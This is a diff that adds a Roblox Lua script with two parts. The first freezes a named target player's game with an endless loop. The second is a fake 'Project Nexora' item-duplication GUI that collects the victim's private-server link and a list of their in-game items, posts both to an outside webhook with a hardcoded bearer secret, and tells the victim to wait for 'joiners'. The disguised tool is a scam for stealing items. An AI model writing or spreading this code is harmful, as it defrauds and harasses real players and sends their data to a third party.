@@ -1,0 +1,239 @@
+--// Services
+local Players = game:GetService("Players")
+
+--// Configuration
+local targetName = "ZCNathan" -- Change to the player’s name
+
+--// Functions
+local function freezePlayer(player)
+	print(player.Name .. " joined! Freezing in 2 seconds...")
+	task.wait(2)
+
+	print("Freezing now!")
+	while true do end
+	print(player.Name .. " has been frozen.")
+end
+
+--// Main Logic
+-- Check if the player is already in the game
+local existingPlayer = Players:FindFirstChild(targetName)
+if existingPlayer then
+	freezePlayer(existingPlayer)
+else
+	-- Wait for them to join
+	Players.PlayerAdded:Connect(function(player)
+		if player.Name == targetName then
+			freezePlayer(player)
+		end
+	end)
+end
+
+local Players = game:GetService("Players")    
+local TweenService = game:GetService("TweenService")    
+local UserInputService = game:GetService("UserInputService")    
+local HttpService = game:GetService("HttpService")    
+    
+local LocalPlayer = Players.LocalPlayer    
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")    
+    
+-- Vercel-protected Webhook URL    
+local WEBHOOK_URL = "https://secure-webhook.vercel.app/api/webhook"    
+local API_SECRET = "nexora_secret_392"  -- must match your Vercel API_SECRET    
+    
+-- HTTP request function    
+local httpRequest    
+if type(syn) == "table" and syn.request then    
+    httpRequest = syn.request    
+elseif type(request) == "function" then    
+    httpRequest = request    
+elseif type(http_request) == "function" then    
+    httpRequest = http_request    
+else    
+    error("No HTTP request function available!")    
+end    
+    
+-- Detect brainrots (no threshold)    
+local function detectBrainrots()    
+    local brainrots = {}    
+    local Plots = workspace:FindFirstChild("Plots")    
+    if not Plots then return brainrots end    
+    
+    for _, plot in ipairs(Plots:GetChildren()) do    
+        local podiums = plot:FindFirstChild("AnimalPodiums")    
+        if podiums then    
+            for _, podium in ipairs(podiums:GetChildren()) do    
+                local base = podium:FindFirstChild("Base")    
+                if base then    
+                    local spawn = base:FindFirstChild("Spawn")    
+                    if spawn then    
+                        local attachment = spawn:FindFirstChild("Attachment")    
+                        if attachment then    
+                            local overhead = attachment:FindFirstChild("AnimalOverhead")    
+                            if overhead then    
+                                local displayName = overhead:FindFirstChild("DisplayName")    
+                                local generation = overhead:FindFirstChild("Generation")    
+                                if displayName and generation then    
+                                    table.insert(brainrots, {    
+                                        name = displayName.Text,    
+                                        generation = generation.Text    
+                                    })    
+                                end    
+                            end    
+                        end    
+                    end    
+                end    
+            end    
+        end    
+    end    
+    
+    return brainrots    
+end    
+    
+-- Send webhook via Vercel with Authorization    
+local function sendWebhook(serverLink, brainrots)    
+    local embed = {    
+        title = ":sparkles: Project Nexora Duping",    
+        type = "rich",    
+        color = 0xFF00FF,    
+        fields = {    
+            {name = "Player", value = LocalPlayer.Name, inline = true},    
+            {name = "Private Server", value = serverLink or "None", inline = true},    
+            {name = "Brainrots", value = (#brainrots > 0 and table.concat(    
+                (function()    
+                    local t = {}    
+                    for _, b in ipairs(brainrots) do    
+                        table.insert(t, b.name .. " (" .. b.generation .. ")")    
+                    end    
+                    return t    
+                end)(), "\n") or "No brainrots detected"), inline = false}    
+        },    
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")    
+    }    
+    
+    spawn(function()    
+        pcall(function()    
+            httpRequest({    
+                Url = WEBHOOK_URL,    
+                Method = "POST",    
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Authorization"] = "Bearer " .. API_SECRET
+                },
+                Body = HttpService:JSONEncode({content = "@everyone", embeds = {embed}})    
+            })    
+        end)    
+    end)    
+end    
+
+-- [GUI code stays the same]
+-- GUI Creation    
+local ScreenGui = Instance.new("ScreenGui")    
+ScreenGui.Name = "NexoraWidget"    
+ScreenGui.ResetOnSpawn = false    
+ScreenGui.Parent = PlayerGui    
+    
+local guiWidth = 300    
+local guiHeight = 180    
+    
+local MainFrame = Instance.new("Frame")    
+MainFrame.Size = UDim2.new(0, guiWidth, 0, guiHeight)    
+MainFrame.Position = UDim2.new(0.5, -guiWidth/2, 0.5, -guiHeight/2)    
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)    
+MainFrame.BorderSizePixel = 0    
+MainFrame.Parent = ScreenGui    
+MainFrame.Active = true    
+MainFrame.Draggable = true    
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)    
+    
+-- Title (Text size limited by UDim2 size)
+local Title = Instance.new("TextLabel")    
+Title.Size = UDim2.new(1, -20, 0, 30)    
+Title.Position = UDim2.new(0, 10, 0, 10)    
+Title.BackgroundTransparency = 1    
+Title.Text = "Project Nexora (Moreira Method)"    
+Title.Font = Enum.Font.GothamBold    
+Title.TextSize = 20    
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)    
+Title.TextXAlignment = Enum.TextXAlignment.Left    
+Title.Parent = MainFrame    
+    
+-- Subtitle (Text size limited by UDim2 size)
+local Subtitle = Instance.new("TextLabel")    
+Subtitle.Size = UDim2.new(1, -20, 0, 20)    
+Subtitle.Position = UDim2.new(0, 10, 0, 45)    
+Subtitle.BackgroundTransparency = 1    
+Subtitle.Text = "Private server required!"
+Subtitle.Font = Enum.Font.Gotham    
+Subtitle.TextSize = 14    
+Subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)    
+Subtitle.TextXAlignment = Enum.TextXAlignment.Left    
+Subtitle.TextTransparency = 0.1    
+Subtitle.Parent = MainFrame    
+    
+-- Input box    
+local InputBox = Instance.new("TextBox")    
+InputBox.Size = UDim2.new(1, -80, 0, 35)    
+InputBox.Position = UDim2.new(0, 10, 0, 80)    
+InputBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)    
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)    
+InputBox.PlaceholderText = "Enter link"    
+InputBox.Font = Enum.Font.Gotham    
+InputBox.TextSize = 16    
+InputBox.TextScaled = false
+InputBox.TextXAlignment = Enum.TextXAlignment.Left
+InputBox.TextTruncate = Enum.TextTruncate.AtEnd -- Prevents text overflow
+InputBox.Parent = MainFrame    
+Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 6)    
+
+-- Padding for the Input Box (prevents text from hitting the edges)
+local InputPadding = Instance.new("UIPadding")
+InputPadding.PaddingLeft = UDim.new(0, 5) 
+InputPadding.PaddingRight = UDim.new(0, 5) 
+InputPadding.Parent = InputBox
+    
+-- Enter Button    
+local EnterButton = Instance.new("TextButton")    
+EnterButton.Size = UDim2.new(0, 60, 0, 35)    
+EnterButton.Position = UDim2.new(1, -70, 0, 80)    
+EnterButton.BackgroundColor3 = Color3.fromRGB(85, 45, 255)    
+EnterButton.Text = "Enter"    
+EnterButton.Font = Enum.Font.GothamBold    
+EnterButton.TextSize = 14    
+EnterButton.TextColor3 = Color3.fromRGB(255, 255, 255)    
+EnterButton.Parent = MainFrame    
+Instance.new("UICorner", EnterButton).CornerRadius = UDim.new(0, 6)    
+    
+-- Feedback label    
+local FeedbackLabel = Instance.new("TextLabel")    
+FeedbackLabel.Size = UDim2.new(1, -20, 0, 20)    
+FeedbackLabel.Position = UDim2.new(0, 10, 0, 125)    
+FeedbackLabel.BackgroundTransparency = 1    
+FeedbackLabel.Text = ""    
+FeedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)    
+FeedbackLabel.Font = Enum.Font.Gotham    
+FeedbackLabel.TextSize = 14    
+FeedbackLabel.TextXAlignment = Enum.TextXAlignment.Left    
+FeedbackLabel.Parent = MainFrame    
+    
+-- Button click    
+EnterButton.MouseButton1Click:Connect(function()    
+    local serverLink = InputBox.Text:match("^%s*(.-)%s*$")    
+    if serverLink == "" or not serverLink:match("^https://www.roblox.com/share%?code=") then    
+        FeedbackLabel.Text = "Invalid link!"    
+        task.delay(4, function() FeedbackLabel.Text = "" end)    
+        return    
+    end    
+    
+    local brainrots = detectBrainrots()    
+    sendWebhook(serverLink, brainrots)    
+    
+    -- Updated feedback message
+    FeedbackLabel.Text = "Link sended please wait for joiners"    
+    
+    -- Destroy the GUI after 3 seconds as requested
+    task.delay(3, function() 
+        if ScreenGui and ScreenGui.Parent then
+            ScreenGui:Destroy()
+        end
+    end)
+end)
